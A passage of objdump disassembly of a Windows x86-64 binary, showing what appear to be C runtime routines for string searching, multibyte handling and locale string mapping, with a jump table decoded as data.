   140009db2:	66 0f 73 f9 0b       	pslldq $0xb,%xmm1
   140009db7:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   140009dbc:	eb 33                	jmp    0x140009df1
   140009dbe:	66 0f 73 f9 0c       	pslldq $0xc,%xmm1
   140009dc3:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   140009dc8:	eb 27                	jmp    0x140009df1
   140009dca:	66 0f 73 f9 0d       	pslldq $0xd,%xmm1
   140009dcf:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   140009dd4:	eb 1b                	jmp    0x140009df1
   140009dd6:	66 0f 73 f9 0e       	pslldq $0xe,%xmm1
   140009ddb:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   140009de0:	eb 0f                	jmp    0x140009df1
   140009de2:	66 0f 73 f9 0f       	pslldq $0xf,%xmm1
   140009de7:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   140009dec:	eb 03                	jmp    0x140009df1
   140009dee:	0f 57 c9             	xorps  %xmm1,%xmm1
   140009df1:	45 85 db             	test   %r11d,%r11d
   140009df4:	0f 85 e6 00 00 00    	jne    0x140009ee0
   140009dfa:	f3 0f 6f 57 10       	movdqu 0x10(%rdi),%xmm2
   140009dff:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   140009e03:	66 0f 74 c3          	pcmpeqb %xmm3,%xmm0
   140009e07:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   140009e0b:	85 c0                	test   %eax,%eax
   140009e0d:	75 35                	jne    0x140009e44
   140009e0f:	48 8b d3             	mov    %rbx,%rdx
   140009e12:	49 8b c8             	mov    %r8,%rcx
   140009e15:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140009e1a:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   140009e1f:	5f                   	pop    %rdi
   140009e20:	e9 5f fd ff ff       	jmp    0x140009b84
   140009e25:	4d 85 d2             	test   %r10,%r10
   140009e28:	75 d0                	jne    0x140009dfa
   140009e2a:	44 38 57 01          	cmp    %r10b,0x1(%rdi)
   140009e2e:	0f 84 ac 00 00 00    	je     0x140009ee0
   140009e34:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140009e39:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   140009e3e:	5f                   	pop    %rdi
   140009e3f:	e9 40 fd ff ff       	jmp    0x140009b84
   140009e44:	0f bc c8             	bsf    %eax,%ecx
   140009e47:	8b c1                	mov    %ecx,%eax
   140009e49:	49 2b c2             	sub    %r10,%rax
   140009e4c:	48 83 c0 10          	add    $0x10,%rax
   140009e50:	48 83 f8 10          	cmp    $0x10,%rax
   140009e54:	77 b9                	ja     0x140009e0f
   140009e56:	44 2b c9             	sub    %ecx,%r9d
   140009e59:	41 83 f9 0f          	cmp    $0xf,%r9d
   140009e5d:	77 79                	ja     0x140009ed8
   140009e5f:	42 8b 8c 8e b8 9f 00 	mov    0x9fb8(%rsi,%r9,4),%ecx
   140009e66:	00 
   140009e67:	48 03 ce             	add    %rsi,%rcx
   140009e6a:	ff e1                	jmp    *%rcx
   140009e6c:	66 0f 73 fa 01       	pslldq $0x1,%xmm2
   140009e71:	eb 65                	jmp    0x140009ed8
   140009e73:	66 0f 73 fa 02       	pslldq $0x2,%xmm2
   140009e78:	eb 5e                	jmp    0x140009ed8
   140009e7a:	66 0f 73 fa 03       	pslldq $0x3,%xmm2
   140009e7f:	eb 57                	jmp    0x140009ed8
   140009e81:	66 0f 73 fa 04       	pslldq $0x4,%xmm2
   140009e86:	eb 50                	jmp    0x140009ed8
   140009e88:	66 0f 73 fa 05       	pslldq $0x5,%xmm2
   140009e8d:	eb 49                	jmp    0x140009ed8
   140009e8f:	66 0f 73 fa 06       	pslldq $0x6,%xmm2
   140009e94:	eb 42                	jmp    0x140009ed8
   140009e96:	66 0f 73 fa 07       	pslldq $0x7,%xmm2
   140009e9b:	eb 3b                	jmp    0x140009ed8
   140009e9d:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   140009ea2:	eb 34                	jmp    0x140009ed8
   140009ea4:	66 0f 73 fa 09       	pslldq $0x9,%xmm2
   140009ea9:	eb 2d                	jmp    0x140009ed8
   140009eab:	66 0f 73 fa 0a       	pslldq $0xa,%xmm2
   140009eb0:	eb 26                	jmp    0x140009ed8
   140009eb2:	66 0f 73 fa 0b       	pslldq $0xb,%xmm2
   140009eb7:	eb 1f                	jmp    0x140009ed8
   140009eb9:	66 0f 73 fa 0c       	pslldq $0xc,%xmm2
   140009ebe:	eb 18                	jmp    0x140009ed8
   140009ec0:	66 0f 73 fa 0d       	pslldq $0xd,%xmm2
   140009ec5:	eb 11                	jmp    0x140009ed8
   140009ec7:	66 0f 73 fa 0e       	pslldq $0xe,%xmm2
   140009ecc:	eb 0a                	jmp    0x140009ed8
   140009ece:	66 0f 73 fa 0f       	pslldq $0xf,%xmm2
   140009ed3:	eb 03                	jmp    0x140009ed8
   140009ed5:	0f 57 d2             	xorps  %xmm2,%xmm2
   140009ed8:	66 0f eb d1          	por    %xmm1,%xmm2
   140009edc:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   140009ee0:	41 0f b6 00          	movzbl (%r8),%eax
   140009ee4:	84 c0                	test   %al,%al
   140009ee6:	74 34                	je     0x140009f1c
   140009ee8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140009eef:	00 
   140009ef0:	0f be c0             	movsbl %al,%eax
   140009ef3:	66 0f 6e c0          	movd   %eax,%xmm0
   140009ef7:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   140009efb:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   140009eff:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   140009f04:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   140009f08:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   140009f0c:	85 c0                	test   %eax,%eax
   140009f0e:	75 1a                	jne    0x140009f2a
   140009f10:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   140009f15:	49 ff c0             	inc    %r8
   140009f18:	84 c0                	test   %al,%al
   140009f1a:	75 d4                	jne    0x140009ef0
   140009f1c:	33 c0                	xor    %eax,%eax
   140009f1e:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140009f23:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   140009f28:	5f                   	pop    %rdi
   140009f29:	c3                   	ret
   140009f2a:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140009f2f:	49 8b c0             	mov    %r8,%rax
   140009f32:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   140009f37:	5f                   	pop    %rdi
   140009f38:	c3                   	ret
   140009f39:	0f 1f 00             	nopl   (%rax)
   140009f3c:	72 9c                	jb     0x140009eda
   140009f3e:	00 00                	add    %al,(%rax)
   140009f40:	79 9c                	jns    0x140009ede
   140009f42:	00 00                	add    %al,(%rax)
   140009f44:	80 9c 00 00 87 9c 00 	sbbb   $0x0,0x9c8700(%rax,%rax,1)
   140009f4b:	00 
   140009f4c:	8e 9c 00 00 95 9c 00 	mov    0x9c9500(%rax,%rax,1),%ds
   140009f53:	00 9c 9c 00 00 a3 9c 	add    %bl,-0x635d0000(%rsp,%rbx,4)
   140009f5a:	00 00                	add    %al,(%rax)
   140009f5c:	aa                   	stos   %al,(%rdi)
   140009f5d:	9c                   	pushf
   140009f5e:	00 00                	add    %al,(%rax)
   140009f60:	b1 9c                	mov    $0x9c,%cl
   140009f62:	00 00                	add    %al,(%rax)
   140009f64:	b8 9c 00 00 bf       	mov    $0xbf00009c,%eax
   140009f69:	9c                   	pushf
   140009f6a:	00 00                	add    %al,(%rax)
   140009f6c:	c6                   	(bad)
   140009f6d:	9c                   	pushf
   140009f6e:	00 00                	add    %al,(%rax)
   140009f70:	cd 9c                	int    $0x9c
   140009f72:	00 00                	add    %al,(%rax)
   140009f74:	d4                   	(bad)
   140009f75:	9c                   	pushf
   140009f76:	00 00                	add    %al,(%rax)
   140009f78:	2e 9d                	cs popf
   140009f7a:	00 00                	add    %al,(%rax)
   140009f7c:	3d 9d 00 00 4c       	cmp    $0x4c00009d,%eax
   140009f81:	9d                   	popf
   140009f82:	00 00                	add    %al,(%rax)
   140009f84:	5b                   	pop    %rbx
   140009f85:	9d                   	popf
   140009f86:	00 00                	add    %al,(%rax)
   140009f88:	6a 9d                	push   $0xffffffffffffff9d
   140009f8a:	00 00                	add    %al,(%rax)
   140009f8c:	76 9d                	jbe    0x140009f2b
   140009f8e:	00 00                	add    %al,(%rax)
   140009f90:	82                   	(bad)
   140009f91:	9d                   	popf
   140009f92:	00 00                	add    %al,(%rax)
   140009f94:	8e 9d 00 00 9a 9d    	mov    -0x62660000(%rbp),%ds
   140009f9a:	00 00                	add    %al,(%rax)
   140009f9c:	a6                   	cmpsb  (%rdi),(%rsi)
   140009f9d:	9d                   	popf
   140009f9e:	00 00                	add    %al,(%rax)
   140009fa0:	b2 9d                	mov    $0x9d,%dl
   140009fa2:	00 00                	add    %al,(%rax)
   140009fa4:	be 9d 00 00 ca       	mov    $0xca00009d,%esi
   140009fa9:	9d                   	popf
   140009faa:	00 00                	add    %al,(%rax)
   140009fac:	d6                   	udb
   140009fad:	9d                   	popf
   140009fae:	00 00                	add    %al,(%rax)
   140009fb0:	e2 9d                	loop   0x140009f4f
   140009fb2:	00 00                	add    %al,(%rax)
   140009fb4:	ee                   	out    %al,(%dx)
   140009fb5:	9d                   	popf
   140009fb6:	00 00                	add    %al,(%rax)
   140009fb8:	6c                   	insb   (%dx),(%rdi)
   140009fb9:	9e                   	sahf
   140009fba:	00 00                	add    %al,(%rax)
   140009fbc:	73 9e                	jae    0x140009f5c
   140009fbe:	00 00                	add    %al,(%rax)
   140009fc0:	7a 9e                	jp     0x140009f60
   140009fc2:	00 00                	add    %al,(%rax)
   140009fc4:	81 9e 00 00 88 9e 00 	sbbl   $0x9e8f0000,-0x61780000(%rsi)
   140009fcb:	00 8f 9e 
   140009fce:	00 00                	add    %al,(%rax)
   140009fd0:	96                   	xchg   %eax,%esi
   140009fd1:	9e                   	sahf
   140009fd2:	00 00                	add    %al,(%rax)
   140009fd4:	9d                   	popf
   140009fd5:	9e                   	sahf
   140009fd6:	00 00                	add    %al,(%rax)
   140009fd8:	a4                   	movsb  (%rsi),(%rdi)
   140009fd9:	9e                   	sahf
   140009fda:	00 00                	add    %al,(%rax)
   140009fdc:	ab                   	stos   %eax,(%rdi)
   140009fdd:	9e                   	sahf
   140009fde:	00 00                	add    %al,(%rax)
   140009fe0:	b2 9e                	mov    $0x9e,%dl
   140009fe2:	00 00                	add    %al,(%rax)
   140009fe4:	b9 9e 00 00 c0       	mov    $0xc000009e,%ecx
   140009fe9:	9e                   	sahf
   140009fea:	00 00                	add    %al,(%rax)
   140009fec:	c7                   	(bad)
   140009fed:	9e                   	sahf
   140009fee:	00 00                	add    %al,(%rax)
   140009ff0:	ce                   	(bad)
   140009ff1:	9e                   	sahf
   140009ff2:	00 00                	add    %al,(%rax)
   140009ff4:	d5 9e 00 00          	{rex2 0x9e} sldt (%r16)
   140009ff8:	45 33 c0             	xor    %r8d,%r8d
   140009ffb:	e9 00 00 00 00       	jmp    0x14000a000
   14000a000:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a005:	57                   	push   %rdi
   14000a006:	48 83 ec 40          	sub    $0x40,%rsp
   14000a00a:	48 8b da             	mov    %rdx,%rbx
   14000a00d:	48 8b f9             	mov    %rcx,%rdi
   14000a010:	48 85 c9             	test   %rcx,%rcx
   14000a013:	75 14                	jne    0x14000a029
   14000a015:	e8 a6 b7 ff ff       	call   0x1400057c0
   14000a01a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a020:	e8 7b b6 ff ff       	call   0x1400056a0
   14000a025:	33 c0                	xor    %eax,%eax
   14000a027:	eb 60                	jmp    0x14000a089
   14000a029:	48 85 db             	test   %rbx,%rbx
   14000a02c:	74 e7                	je     0x14000a015
   14000a02e:	48 3b fb             	cmp    %rbx,%rdi
   14000a031:	73 f2                	jae    0x14000a025
   14000a033:	49 8b d0             	mov    %r8,%rdx
   14000a036:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000a03b:	e8 d4 ac ff ff       	call   0x140004d14
   14000a040:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000a045:	48 8d 53 ff          	lea    -0x1(%rbx),%rdx
   14000a049:	83 79 08 00          	cmpl   $0x0,0x8(%rcx)
   14000a04d:	74 24                	je     0x14000a073
   14000a04f:	48 ff ca             	dec    %rdx
   14000a052:	48 3b fa             	cmp    %rdx,%rdi
   14000a055:	77 0a                	ja     0x14000a061
   14000a057:	0f b6 02             	movzbl (%rdx),%eax
   14000a05a:	f6 44 08 19 04       	testb  $0x4,0x19(%rax,%rcx,1)
   14000a05f:	75 ee                	jne    0x14000a04f
   14000a061:	48 8b cb             	mov    %rbx,%rcx
   14000a064:	48 2b ca             	sub    %rdx,%rcx
   14000a067:	48 8b d3             	mov    %rbx,%rdx
   14000a06a:	83 e1 01             	and    $0x1,%ecx
   14000a06d:	48 2b d1             	sub    %rcx,%rdx
   14000a070:	48 ff ca             	dec    %rdx
   14000a073:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000a078:	74 0c                	je     0x14000a086
   14000a07a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000a07f:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000a086:	48 8b c2             	mov    %rdx,%rax
   14000a089:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000a08e:	48 83 c4 40          	add    $0x40,%rsp
   14000a092:	5f                   	pop    %rdi
   14000a093:	c3                   	ret
   14000a094:	40 55                	rex push %rbp
   14000a096:	41 54                	push   %r12
   14000a098:	41 55                	push   %r13
   14000a09a:	41 56                	push   %r14
   14000a09c:	41 57                	push   %r15
   14000a09e:	48 83 ec 60          	sub    $0x60,%rsp
   14000a0a2:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000a0a7:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   14000a0ab:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   14000a0af:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   14000a0b3:	48 8b 05 6e cf 00 00 	mov    0xcf6e(%rip),%rax        # 0x140017028
   14000a0ba:	48 33 c5             	xor    %rbp,%rax
   14000a0bd:	48 89 45 08          	mov    %rax,0x8(%rbp)
   14000a0c1:	48 63 5d 60          	movslq 0x60(%rbp),%rbx
   14000a0c5:	4d 8b f9             	mov    %r9,%r15
   14000a0c8:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   14000a0cc:	45 8b e8             	mov    %r8d,%r13d
   14000a0cf:	48 8b f9             	mov    %rcx,%rdi
   14000a0d2:	85 db                	test   %ebx,%ebx
   14000a0d4:	7e 14                	jle    0x14000a0ea
   14000a0d6:	48 8b d3             	mov    %rbx,%rdx
   14000a0d9:	49 8b c9             	mov    %r9,%rcx
   14000a0dc:	e8 9f 18 00 00       	call   0x14000b980
   14000a0e1:	3b c3                	cmp    %ebx,%eax
   14000a0e3:	8d 58 01             	lea    0x1(%rax),%ebx
   14000a0e6:	7c 02                	jl     0x14000a0ea
   14000a0e8:	8b d8                	mov    %eax,%ebx
   14000a0ea:	44 8b 75 78          	mov    0x78(%rbp),%r14d
   14000a0ee:	45 85 f6             	test   %r14d,%r14d
   14000a0f1:	75 07                	jne    0x14000a0fa
   14000a0f3:	48 8b 07             	mov    (%rdi),%rax
   14000a0f6:	44 8b 70 0c          	mov    0xc(%rax),%r14d
   14000a0fa:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   14000a100:	44 8b cb             	mov    %ebx,%r9d
   14000a103:	4d 8b c7             	mov    %r15,%r8
   14000a106:	41 8b ce             	mov    %r14d,%ecx
   14000a109:	1b d2                	sbb    %edx,%edx
   14000a10b:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000a110:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000a116:	83 e2 08             	and    $0x8,%edx
   14000a119:	ff c2                	inc    %edx
   14000a11b:	e8 5c ce ff ff       	call   0x140006f7c
   14000a120:	4c 63 e0             	movslq %eax,%r12
   14000a123:	85 c0                	test   %eax,%eax
   14000a125:	0f 84 36 02 00 00    	je     0x14000a361
   14000a12b:	49 8b c4             	mov    %r12,%rax
   14000a12e:	49 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r8
   14000a135:	ff ff 0f 
   14000a138:	48 03 c0             	add    %rax,%rax
   14000a13b:	48 8d 48 10          	lea    0x10(%rax),%rcx
   14000a13f:	48 3b c1             	cmp    %rcx,%rax
   14000a142:	48 1b d2             	sbb    %rdx,%rdx
   14000a145:	48 23 d1             	and    %rcx,%rdx
   14000a148:	74 53                	je     0x14000a19d
   14000a14a:	48 81 fa 00 04 00 00 	cmp    $0x400,%rdx
   14000a151:	77 2e                	ja     0x14000a181
   14000a153:	48 8d 42 0f          	lea    0xf(%rdx),%rax
   14000a157:	48 3b c2             	cmp    %rdx,%rax
   14000a15a:	77 03                	ja     0x14000a15f
   14000a15c:	49 8b c0             	mov    %r8,%rax
   14000a15f:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000a163:	e8 28 36 00 00       	call   0x14000d790
   14000a168:	48 2b e0             	sub    %rax,%rsp
   14000a16b:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
   14000a170:	48 85 f6             	test   %rsi,%rsi
   14000a173:	0f 84 ce 01 00 00    	je     0x14000a347
   14000a179:	c7 06 cc cc 00 00    	movl   $0xcccc,(%rsi)
   14000a17f:	eb 16                	jmp    0x14000a197
   14000a181:	48 8b ca             	mov    %rdx,%rcx
   14000a184:	e8 c7 dd ff ff       	call   0x140007f50
   14000a189:	48 8b f0             	mov    %rax,%rsi
   14000a18c:	48 85 c0             	test   %rax,%rax
   14000a18f:	74 0e                	je     0x14000a19f
   14000a191:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000a197:	48 83 c6 10          	add    $0x10,%rsi
   14000a19b:	eb 02                	jmp    0x14000a19f
   14000a19d:	33 f6                	xor    %esi,%esi
   14000a19f:	48 85 f6             	test   %rsi,%rsi
   14000a1a2:	0f 84 9f 01 00 00    	je     0x14000a347
   14000a1a8:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   14000a1ad:	44 8b cb             	mov    %ebx,%r9d
   14000a1b0:	4d 8b c7             	mov    %r15,%r8
   14000a1b3:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000a1b8:	ba 01 00 00 00       	mov    $0x1,%edx
   14000a1bd:	41 8b ce             	mov    %r14d,%ecx
   14000a1c0:	e8 b7 cd ff ff       	call   0x140006f7c
   14000a1c5:	85 c0                	test   %eax,%eax
   14000a1c7:	0f 84 7a 01 00 00    	je     0x14000a347
   14000a1cd:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000a1d3:	45 8b cc             	mov    %r12d,%r9d
   14000a1d6:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000a1dc:	4c 8b c6             	mov    %rsi,%r8
   14000a1df:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000a1e5:	41 8b d5             	mov    %r13d,%edx
   14000a1e8:	4c 8b 7d 00          	mov    0x0(%rbp),%r15
   14000a1ec:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000a1f1:	49 8b cf             	mov    %r15,%rcx
   14000a1f4:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000a1fa:	e8 1d e8 ff ff       	call   0x140008a1c
   14000a1ff:	48 63 f8             	movslq %eax,%rdi
   14000a202:	85 c0                	test   %eax,%eax
   14000a204:	0f 84 3d 01 00 00    	je     0x14000a347
   14000a20a:	ba 00 04 00 00       	mov    $0x400,%edx
   14000a20f:	44 85 ea             	test   %r13d,%edx
   14000a212:	74 52                	je     0x14000a266
   14000a214:	8b 45 70             	mov    0x70(%rbp),%eax
   14000a217:	85 c0                	test   %eax,%eax
   14000a219:	0f 84 2a 01 00 00    	je     0x14000a349
   14000a21f:	3b f8                	cmp    %eax,%edi
   14000a221:	0f 8f 20 01 00 00    	jg     0x14000a347
   14000a227:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000a22d:	45 8b cc             	mov    %r12d,%r9d
   14000a230:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000a236:	4c 8b c6             	mov    %rsi,%r8
   14000a239:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000a23f:	41 8b d5             	mov    %r13d,%edx
   14000a242:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000a246:	49 8b cf             	mov    %r15,%rcx
   14000a249:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000a24d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a252:	e8 c5 e7 ff ff       	call   0x140008a1c
   14000a257:	8b f8                	mov    %eax,%edi
   14000a259:	85 c0                	test   %eax,%eax
   14000a25b:	0f 85 e8 00 00 00    	jne    0x14000a349
   14000a261:	e9 e1 00 00 00       	jmp    0x14000a347
   14000a266:	48 8b cf             	mov    %rdi,%rcx
   14000a269:	48 03 c9             	add    %rcx,%rcx
   14000a26c:	48 8d 41 10          	lea    0x10(%rcx),%rax
   14000a270:	48 3b c8             	cmp    %rax,%rcx
   14000a273:	48 1b c9             	sbb    %rcx,%rcx
   14000a276:	48 23 c8             	and    %rax,%rcx
   14000a279:	74 53                	je     0x14000a2ce
   14000a27b:	48 3b ca             	cmp    %rdx,%rcx
   14000a27e:	77 35                	ja     0x14000a2b5
   14000a280:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000a284:	48 3b c1             	cmp    %rcx,%rax
   14000a287:	77 0a                	ja     0x14000a293
   14000a289:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   14000a290:	ff ff 0f 
   14000a293:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000a297:	e8 f4 34 00 00       	call   0x14000d790
   14000a29c:	48 2b e0             	sub    %rax,%rsp
   14000a29f:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   14000a2a4:	48 85 db             	test   %rbx,%rbx
   14000a2a7:	0f 84 9a 00 00 00    	je     0x14000a347
   14000a2ad:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000a2b3:	eb 13                	jmp    0x14000a2c8
   14000a2b5:	e8 96 dc ff ff       	call   0x140007f50
   14000a2ba:	48 8b d8             	mov    %rax,%rbx
   14000a2bd:	48 85 c0             	test   %rax,%rax
   14000a2c0:	74 0e                	je     0x14000a2d0
   14000a2c2:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000a2c8:	48 83 c3 10          	add    $0x10,%rbx
   14000a2cc:	eb 02                	jmp    0x14000a2d0
   14000a2ce:	33 db                	xor    %ebx,%ebx
   14000a2d0:	48 85 db             	test   %rbx,%rbx
   14000a2d3:	74 72                	je     0x14000a347
   14000a2d5:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000a2db:	45 8b cc             	mov    %r12d,%r9d
   14000a2de:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000a2e4:	4c 8b c6             	mov    %rsi,%r8
   14000a2e7:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000a2ed:	41 8b d5             	mov    %r13d,%edx
   14000a2f0:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   14000a2f4:	49 8b cf             	mov    %r15,%rcx
   14000a2f7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000a2fc:	e8 1b e7 ff ff       	call   0x140008a1c
   14000a301:	85 c0                	test   %eax,%eax
   14000a303:	74 31                	je     0x14000a336
   14000a305:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000a30b:	33 d2                	xor    %edx,%edx
   14000a30d:	48 21 54 24 30       	and    %rdx,0x30(%rsp)
   14000a312:	44 8b cf             	mov    %edi,%r9d
   14000a315:	8b 45 70             	mov    0x70(%rbp),%eax
   14000a318:	4c 8b c3             	mov    %rbx,%r8
   14000a31b:	41 8b ce             	mov    %r14d,%ecx
   14000a31e:	85 c0                	test   %eax,%eax
   14000a320:	75 65                	jne    0x14000a387
   14000a322:	21 54 24 28          	and    %edx,0x28(%rsp)
   14000a326:	48 21 54 24 20       	and    %rdx,0x20(%rsp)
   14000a32b:	e8 a8 cc ff ff       	call   0x140006fd8
   14000a330:	8b f8                	mov    %eax,%edi
   14000a332:	85 c0                	test   %eax,%eax
   14000a334:	75 60                	jne    0x14000a396
   14000a336:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000a33a:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000a340:	75 05                	jne    0x14000a347
   14000a342:	e8 11 b5 ff ff       	call   0x140005858
   14000a347:	33 ff                	xor    %edi,%edi
   14000a349:	48 85 f6             	test   %rsi,%rsi
   14000a34c:	74 11                	je     0x14000a35f
   14000a34e:	48 8d 4e f0          	lea    -0x10(%rsi),%rcx
   14000a352:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000a358:	75 05                	jne    0x14000a35f
   14000a35a:	e8 f9 b4 ff ff       	call   0x140005858
   14000a35f:	8b c7                	mov    %edi,%eax
   14000a361:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   14000a365:	48 33 cd             	xor    %rbp,%rcx
   14000a368:	e8 83 30 00 00       	call   0x14000d3f0
   14000a36d:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   14000a371:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   14000a375:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   14000a379:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   14000a37d:	41 5f                	pop    %r15
   14000a37f:	41 5e                	pop    %r14
   14000a381:	41 5d                	pop    %r13
   14000a383:	41 5c                	pop    %r12
   14000a385:	5d                   	pop    %rbp
   14000a386:	c3                   	ret
   14000a387:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000a38b:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000a38f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a394:	eb 95                	jmp    0x14000a32b
   14000a396:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000a39a:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000a3a0:	75 a7                	jne    0x14000a349
   14000a3a2:	e8 b1 b4 ff ff       	call   0x140005858
   14000a3a7:	eb a0                	jmp    0x14000a349
   14000a3a9:	cc                   	int3
   14000a3aa:	cc                   	int3
   14000a3ab:	cc                   	int3
   14000a3ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a3b1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000a3b6:	57                   	push   %rdi
   14000a3b7:	48 83 ec 70          	sub    $0x70,%rsp
   14000a3bb:	48 8b f2             	mov    %rdx,%rsi
   14000a3be:	49 8b d9             	mov    %r9,%rbx
   14000a3c1:	48 8b d1             	mov    %rcx,%rdx
   14000a3c4:	41 8b f8             	mov    %r8d,%edi
   14000a3c7:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000a3cc:	e8 43 a9 ff ff       	call   0x140004d14
   14000a3d1:	8b 84 24 c0 00 00 00 	mov    0xc0(%rsp),%eax
   14000a3d8:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000a3dd:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000a3e1:	4c 8b cb             	mov    %rbx,%r9
   14000a3e4:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   14000a3eb:	44 8b c7             	mov    %edi,%r8d
   14000a3ee:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000a3f2:	48 8b d6             	mov    %rsi,%rdx
   14000a3f5:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   14000a3fc:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000a400:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   14000a407:	00 
   14000a408:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000a40d:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   14000a414:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000a418:	e8 77 fc ff ff       	call   0x14000a094
   14000a41d:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   14000a422:	74 0c                	je     0x14000a430
   14000a424:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000a429:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000a430:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   14000a435:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000a439:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000a43d:	49 8b e3             	mov    %r11,%rsp
   14000a440:	5f                   	pop    %rdi
   14000a441:	c3                   	ret
   14000a442:	cc                   	int3
   14000a443:	cc                   	int3
   14000a444:	48 83 ec 28          	sub    $0x28,%rsp
   14000a448:	e8 6b c7 ff ff       	call   0x140006bb8
   14000a44d:	33 c9                	xor    %ecx,%ecx
   14000a44f:	84 c0                	test   %al,%al
   14000a451:	0f 94 c1             	sete   %cl
   14000a454:	8b c1                	mov    %ecx,%eax
   14000a456:	48 83 c4 28          	add    $0x28,%rsp
   14000a45a:	c3                   	ret
   14000a45b:	cc                   	int3
